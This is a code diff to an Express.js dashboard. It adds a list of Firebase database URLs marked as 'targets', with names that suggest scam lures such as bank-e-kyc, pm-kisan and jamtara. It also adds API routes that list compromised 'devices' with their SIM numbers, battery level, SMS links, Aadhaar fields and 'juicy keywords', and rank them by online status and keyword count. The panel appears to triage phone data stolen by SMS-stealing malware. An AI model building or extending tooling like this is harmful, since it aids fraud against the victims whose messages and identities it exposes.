@@ -8,7 +8,88 @@ const app = express();
 const PORT = 3000;
 
 // ── Path to bot's working directory (where devices_database_*.json live) ──────
-const BOT_DIR = process.env.BOT_DIR || '/home/ubuntu/newp';
+const BOT_DIR     = process.env.BOT_DIR     || '/home/ubuntu/newp';
+const OLD_BOT_DIR = process.env.OLD_BOT_DIR || '/home/ubuntu';
+
+// ── OLD RAW_TARGETS from DAprevious.py ────────────────────────────────────────
+const OLD_RAW_TARGETS = [
+  [20, 'https://projectsb0810-default-rtdb.firebaseio.com'],
+  [23, 'https://samar84900-6f084-default-rtdb.firebaseio.com'],
+  [27, 'https://pm-kisan-22f92-default-rtdb.firebaseio.com'],
+  [31, 'https://dark-274b4-default-rtdb.firebaseio.com'],
+  [32, 'https://pm-india-07yg-default-rtdb.firebaseio.com'],
+  [33, 'https://jamtara123-42608-default-rtdb.firebaseio.com'],
+  [37, 'https://bank-e-kyc-default-rtdb.firebaseio.com'],
+  [40, 'https://rt5nr-2f3ef-default-rtdb.firebaseio.com'],
+  [44, 'https://pk114-6e828-default-rtdb.firebaseio.com'],
+  [45, 'https://ultra-14-default-rtdb.firebaseio.com'],
+  [46, 'https://samar84900-6f084-default-rtdb.firebaseio.com'],
+  [52, 'https://kk60-e4ebc-default-rtdb.firebaseio.com'],
+  [53, 'https://bob1-23ad2-default-rtdb.firebaseio.com'],
+  [56, 'https://pvn7-a873a-default-rtdb.firebaseio.com'],
+  [65, 'https://jamtara133-61d7e-default-rtdb.firebaseio.com'],
+  [66, 'https://jamtara181-default-rtdb.firebaseio.com'],
+  [68, 'https://hdmax1-58366-default-rtdb.firebaseio.com'],
+  [69, 'https://smas-8bff8-default-rtdb.firebaseio.com'],
+  [70, 'https://challan5-default-rtdb.firebaseio.com'],
+  [72, 'https://chhnuk05-3188e-default-rtdb.firebaseio.com'],
+  [73, 'https://s85138920-87594-default-rtdb.firebaseio.com'],
+  [84, 'https://access25-54355-default-rtdb.firebaseio.com'],
+  [85, 'https://access26-default-rtdb.firebaseio.com'],
+  [86, 'https://access28-9a395-default-rtdb.firebaseio.com'],
+  [87, 'https://replace-3e6bb-default-rtdb.firebaseio.com'],
+  [88, 'https://shoot44-default-rtdb.firebaseio.com'],
+  [89, 'https://rto45-9d572-default-rtdb.firebaseio.com'],
+  [100,'https://samar84900-6f084-default-rtdb.firebaseio.com'],
+];
+
+// Schema sets for OLD URLs (from DAprevious.py)
+const OLD_SCHEMA_2 = new Set([44, 52]);
+const OLD_SCHEMA_3 = new Set([23,27,32,33,37,40,45,46,56,65,66,68,69,70,72,73,100]);
+const OLD_SCHEMA_4 = new Set([31]);
+// All others → schema 1 (20,53,84,85,86,87,88,89)
+
+function getOldSchema(id) {
+  if (OLD_SCHEMA_2.has(id)) return 2;
+  if (OLD_SCHEMA_3.has(id)) return 3;
+  if (OLD_SCHEMA_4.has(id)) return 4;
+  return 1;
+}
+
+const OLD_TARGETS = OLD_RAW_TARGETS.map(([id, url]) => ({
+  id, url: url.replace(/\/$/, ''), schema: getOldSchema(id)
+}));
+
+function loadOldDb(targetId) {
+  const file = path.join(OLD_BOT_DIR, `devices_database_${targetId}.json`);
+  try {
+    if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
+  } catch {}
+  return {};
+}
+
+function summariseOldTarget(target) {
+  const devices = loadOldDb(target.id);
+  const deviceList = Object.entries(devices);
+  const total = deviceList.length;
+  let online = 0, juicyCount = 0;
+  let oldestActivity = null, newestActivity = null;
+  for (const [, dev] of deviceList) {
+    if (dev.current_status === 'online') online++;
+    if ((dev.juicy_keywords || []).length > 0) juicyCount++;
+    const act = parseLastActivity(dev.last_activity);
+    if (act) {
+      if (!oldestActivity || act < oldestActivity) oldestActivity = act;
+      if (!newestActivity || act > newestActivity) newestActivity = act;
+    }
+  }
+  return {
+    id: target.id, url: target.url, schema: target.schema,
+    total, online, offline: total - online, juicyCount,
+    oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
+    newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
+  };
+}
 
 // ── RAW_TARGETS from DA1.py ───────────────────────────────────────────────────
 const RAW_TARGETS = [
@@ -228,6 +309,66 @@ function summariseTarget(target) {
 app.get('/api/urls', (req, res) => {
   const summaries = TARGETS.map(t => summariseTarget(t));
   res.json(summaries);
+});
+
+// ── OLD URLs API routes ───────────────────────────────────────────────────────
+app.get('/api/old/urls', (req, res) => {
+  res.json(OLD_TARGETS.map(t => summariseOldTarget(t)));
+});
+
+app.get('/api/old/url/:id', (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = OLD_TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+
+  const devices = loadOldDb(id);
+  const simOverrides = loadSimOverrides();
+  const simForUrl = simOverrides[`old_${id}`] || {};
+
+  const deviceList = Object.entries(devices)
+    .map(([deviceId, dev]) => ({
+      deviceId,
+      brand:        dev.brand || 'Unknown',
+      status:       dev.current_status || 'offline',
+      battery:      dev.last_battery || 'N/A',
+      lastActivity: dev.last_activity || null,
+      lastOnline:   dev.last_online || null,
+      sim1:         dev.sim1_number || 'N/A',
+      sim2:         dev.sim2_number || 'N/A',
+      sim1Clean:    extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
+      sim2Clean:    extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
+      sim1Override: simForUrl[deviceId]?.sim1 || '',
+      sim2Override: simForUrl[deviceId]?.sim2 || '',
+      juicyKeywords: dev.juicy_keywords || [],
+      appId:        dev.app_id || 'N/A',
+      objId:        dev.obj_id || 'N/A',
+      hasAadhaar:   false,
+      aadhaarNums:  [],
+      smsLink:      getSmsLink(target, deviceId, dev.obj_id),
+    }))
+    .sort((a, b) => {
+      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
+      if (b.juicyKeywords.length !== a.juicyKeywords.length)
+        return b.juicyKeywords.length - a.juicyKeywords.length;
+      return 0;
+    });
+
+  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
+});
+
+app.post('/api/old/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
+  const { urlId, deviceId } = req.params;
+  const { sim1, sim2 } = req.body;
+  const overrides = loadSimOverrides();
+  const key = `old_${urlId}`;
+  if (!overrides[key]) overrides[key] = {};
+  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
+  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
+  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
+  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
+    delete overrides[key][deviceId];
+  saveSimOverrides(overrides);
+  res.json({ ok: true });
 });
 
 app.get('/api/url/:id', (req, res) => {
